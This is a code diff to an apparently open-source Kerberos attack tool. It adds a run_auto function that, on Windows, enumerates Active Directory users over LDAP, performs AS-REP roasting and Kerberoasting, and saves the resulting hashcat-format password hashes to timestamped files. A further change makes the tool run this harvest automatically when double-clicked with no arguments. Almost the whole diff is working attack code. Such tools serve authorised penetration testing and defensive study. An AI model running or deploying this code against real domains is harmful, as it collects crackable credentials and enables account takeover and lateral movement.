@@ -27,7 +27,9 @@ import getpass
 import os
 import csv
 import platform
+import sys
 from urllib.parse import urlparse, parse_qs
+import datetime
 
 kerberoast_epilog = """==== Extra Help ====
 Dump all users from LDAP in a TSV file:
@@ -109,7 +111,7 @@ async def spnmultiplexor(args):
 			results.append(TGSTicket2hashcat(aprep))
 
 		if args.out_file:
-			with open(args.out_file, 'w') as f:
+			with open(args.out_file, 'w', newline = '') as f:
 				for thash in results:
 					f.write(thash + '\r\n')
 
@@ -179,6 +181,89 @@ def get_target_from_args(args, to_spn = True):
 			targets.append(target)
 	return targets
 
+async def run_auto():
+	try:
+		if platform.system() != 'Windows':
+			print('[-]This command only works on Windows!')
+			return
+		try:
+			from winsspi.sspi import KerberoastSSPI
+		except ImportError:
+			raise Exception('winsspi module not installed!')
+
+		from winacl.functions.highlevel import get_logon_info
+		
+		logon = get_logon_info()
+		domain = logon['domain']
+		url = 'ldap+sspi-ntlm://%s' % logon['logoserver']
+		msldap_url = MSLDAPURLDecoder(url)
+		client = msldap_url.get_client()
+		_, err = await client.connect()
+		if err is not None:
+			raise err
+
+		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
+		spn_users = []
+		asrep_users = []
+		errors = []
+		spn_cnt = 0
+		asrep_cnt = 0
+		async for user, err in client.get_all_knoreq_users():
+			if err is not None:
+				raise err
+			cred = KerberosCredential()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+			
+			asrep_users.append(cred)
+		async for user, err in client.get_all_service_users():
+			if err is not None:
+				raise err
+			cred = KerberosCredential()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+			
+			spn_users.append(cred)
+			
+		for cred in asrep_users:
+			results = []
+			ks = KerberosTarget(domain)
+			ar = APREPRoast(ks)
+			res = await ar.run(cred, override_etype = [23])
+			results.append(res)	
+			
+		filename = 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
+		with open(filename, 'w', newline = '') as f:
+				for thash in results:
+					asrep_cnt += 1
+					f.write(thash + '\r\n')
+
+		results = []
+		for cred in spn_users:
+			spn_name = '%s@%s' % (cred.username, cred.domain)
+			if spn_name[:6] == 'krbtgt':
+				continue
+			ksspi = KerberoastSSPI()
+			try:
+				ticket = ksspi.get_ticket_for_spn(spn_name)
+			except Exception as e:
+				errors.append((spn_name, e))
+				continue
+			results.append(TGSTicket2hashcat(ticket))
+		
+		filename = 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
+		with open(filename, 'w', newline = '') as f:
+			for thash in results:
+				spn_cnt += 1
+				f.write(thash + '\r\n')
+				
+		for err in errors:
+			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
+	
+		print('[+] Done! %s spnroast tickets %s asreproast tickets' % (spn_cnt, asrep_cnt))
+	except Exception as e:
+		print(e)
+
 
 async def amain(args):
 	if args.command == 'tgs':
@@ -234,7 +319,7 @@ async def amain(args):
 			hashes.append(h)
 
 		if args.out_file:
-			with open(args.out_file, 'w') as f:
+			with open(args.out_file, 'w', newline = '') as f:
 				for thash in hashes:
 					f.write(thash + '\r\n')
 
@@ -272,7 +357,7 @@ async def amain(args):
 		hashes = await ar.run(targets, override_etype = etypes)
 
 		if args.out_file:
-			with open(args.out_file, 'w') as f:
+			with open(args.out_file, 'w', newline = '') as f:
 				for thash in hashes:
 					f.write(thash + '\r\n')
 
@@ -333,7 +418,7 @@ async def amain(args):
 			results.append(TGSTicket2hashcat(ticket))
 			
 		if args.out_file:
-			with open(args.out_file, 'w') as f:
+			with open(args.out_file, 'w', newline = '') as f:
 				for thash in results:
 					f.write(thash + '\r\n')
 
@@ -351,72 +436,7 @@ async def amain(args):
 		await spnmultiplexor(args)
 
 	elif args.command == 'auto':
-		if platform.system() != 'Windows':
-			print('[-]This command only works on Windows!')
-			return
-		try:
-			from winsspi.sspi import KerberoastSSPI
-		except ImportError:
-			raise Exception('winsspi module not installed!')
-		
-		domain = args.dc_ip
-		url = 'ldap+sspi-ntlm://%s' % domain
-		msldap_url = MSLDAPURLDecoder(url)
-		client = msldap_url.get_client()
-		_, err = await client.connect()
-		if err is not None:
-			raise err
-
-		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
-		spn_users = []
-		asrep_users = []
-		results = []
-		errors = []
-		async for user, err in client.get_all_knoreq_users():
-			if err is not None:
-				raise err
-			cred = KerberosCredential()
-			cred.username = user.sAMAccountName
-			cred.domain = domain
-			
-			asrep_users.append(cred)
-		async for user, err in client.get_all_service_users():
-			if err is not None:
-				raise err
-			cred = KerberosCredential()
-			cred.username = user.sAMAccountName
-			cred.domain = domain
-			
-			spn_users.append(cred)
-			
-		for cred in asrep_users:
-			ks = KerberosTarget(domain)
-			ar = APREPRoast(ks)
-			res = await ar.run(cred, override_etype = [args.etype])
-			results.append(res)
-
-		for cred in spn_users:
-			spn_name = '%s@%s' % (cred.username, cred.domain)
-			if spn_name[:6] == 'krbtgt':
-				continue
-			ksspi = KerberoastSSPI()
-			try:
-				ticket = ksspi.get_ticket_for_spn(spn_name)
-			except Exception as e:
-				errors.append((spn_name, e))
-				continue
-			results.append(TGSTicket2hashcat(ticket))
-			
-		if args.out_file:
-			with open(args.out_file, 'w') as f:
-				for thash in results:
-					f.write(thash + '\r\n')
-		else:
-			for thash in results:
-				print(thash)
-				
-		for err in errors:
-			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
+		await run_auto()
 		
 	elif args.command == 'ldap':
 		ldap_url = MSLDAPURLDecoder(args.ldap_url)
@@ -526,6 +546,11 @@ async def amain(args):
 
 
 def main():
+	if platform.system().upper() == 'WINDOWS' and len(sys.argv) == 1:
+		#auto start on double click with default settings
+		asyncio.run(run_auto())
+		return
+
 	import argparse
 
 	parser = argparse.ArgumentParser(description='Tool to perform verious kerberos security tests', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberoast_epilog)
